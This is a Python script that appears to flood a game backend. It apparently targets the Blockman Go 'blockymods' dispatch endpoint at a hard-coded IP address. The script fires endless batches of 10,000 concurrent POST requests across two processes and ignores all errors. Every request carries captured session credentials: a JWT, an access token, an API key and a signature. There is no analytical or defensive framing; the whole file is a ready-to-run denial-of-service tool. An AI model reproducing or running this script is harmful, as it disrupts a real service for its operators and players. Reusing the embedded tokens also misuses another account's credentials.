import asyncio
import multiprocessing

import aiohttp
import uvloop

headers = {
    "x-shahe-uid": "8878880",
    "x-shahe-token": "eyJhbGciOiJSUzI1NiJ9.eyJ1aWQiOjg4Nzg4ODAsImd0eXBlIjoiZzEwMDgiLCJpc3MiOiI4ODc4ODgwIiwiZXhwIjoxNzQwMTI4NzEwfQ.beD1lS4qm0iZdIKAevPA6BSCinRAQSVaGDTNKIXRoivPOWwpuK8Ypx8E1rUmxT7i19xP13Kn5M6rWUQso9hluji4XZ1RM5-1EMMr34geDZwHlucUD0VV4iARREgAi26wHiWE-pG8q3whcxM3o0PCwafo7AaJUHfQn-j04m2jo4QzOEsXiMdFcYv615qmcw8HzZKz4WsXtmSnzIDkgZMcnv0NrZXm0x990xVnpf0iYIt-ATAm4Ow-QEyYA3ReUR4HTzWKV_ILm3g73L_fDYekBjZHSg88K8VHcKXjhpBVY58TcsxQ67JKWwF-Ktj3AuwsCLAu9wWf-OMCbOaZ6nN_bw",
    "userId": "8878880",
    "packageName": "blockymods",
    "packageNameFull": "com.sandboxol.blockymods",
    "androidVersion": "30",
    "OS": "android",
    "appType": "android",
    "appLanguage": "en",
    "appVersion": "5221",
    "appVersionName": "2.105.1",
    "channel": "sandbox",
    "uid_register_ts": "1520827184",
    "device_register_ts": "1718718484",
    "eventType": "app",
    "userDeviceId": "f214e1d788c7df93",
    "userLanguage": "en_US",
    "region": "RU",
    "clientType": "client",
    "env": "prd",
    "package_name_en": "com.sandboxol.blockymods",
    "md5": "5d0de77b0f4b93b44669f146e54b49d9",
    "X-ApiKey": "6aDtpIdzQdgGwrpP6HzuPA",
    "X-Nonce": "3718a0d0-bd09-4d31-b5ac-22f52129b6c6",
    "X-Time": "1740128115",
    "X-Sign": "ba7a61a25c112886bfbdc961926fa6ce",
    "X-UrlPath": "/v1/dispatch",
    "Access-Token": "ELPJaCzz5+V0e25U08NkzF3yNgcLHlLBeYSU4fJvPkMlGgTzfEqXwTRlW++nSbW0mHmKQhRHJg9Q/7jfcRiCO/buqZ1mx8kkOFBQZygR8Pv1Bsj0Dp4bB+mcFZ2lbvTSLGMAVu75vVqiJkOhUlCesE/151hcyIABmeqtwX8VsGOlfO2EjRPSFgnM12473qMGj1ChH5wkx2H/enez4eVG+VhOywdpzfdVv4D1TYPsHiANd/+J7v/4e1EDnizVmsBkiXdrImL3gEu8WaeADCy4Gp+h3Jt7GHdjfjYK6JSy89VAWQ0W0ce6QrqVoNXW52Y/tHaitof6W5tp3aGITFmdLg==",
    "Content-Type": "application/json; charset=UTF-8",
    "Host": "130.61.18.134:9902",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "User-Agent": "okhttp/4.11.0"
}

data = {"country":"RU","targetId":8878880,"appVer":"5221","retryCount":0,"excludeIps":[""],"pioneer":True,"rid":8029,"clz":0,"ever":10109,"picUrl":"http://staticgs.sandboxol.com/sandbox/avatar/1722350941634476.jpg","clientType":1,"name":"NULLОWNS","mapId":"m1008_2","packageName":"blockymods","lang":"en"}

async def run():
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=0)) as session:
        while True:
            tasks = [session.post("http://130.61.18.134:9902/v1/dispatch", headers=headers, json=data) for _ in range(10000)]
            try:
                await asyncio.gather(*tasks)
            except:
                pass

def main():
    uvloop.run(run())

for _ in range(2):
    multiprocessing.Process(target=main).start()
